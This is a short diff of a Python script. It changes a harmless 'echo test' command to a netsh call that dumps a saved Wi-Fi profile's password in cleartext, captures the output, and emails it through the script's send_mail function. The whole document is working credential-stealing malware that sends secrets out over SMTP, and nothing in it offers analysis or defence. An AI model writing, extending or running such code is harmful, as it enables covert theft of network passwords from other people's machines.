@@ -9,6 +9,7 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-command = "echo test"
+command = "netsh wlan show profile CGN-78D0 key=clear"
 
-subprocess.Popen(command, shell=True)
+result = subprocess.check_output(command, shell=True)
+send_mail("", "", result)
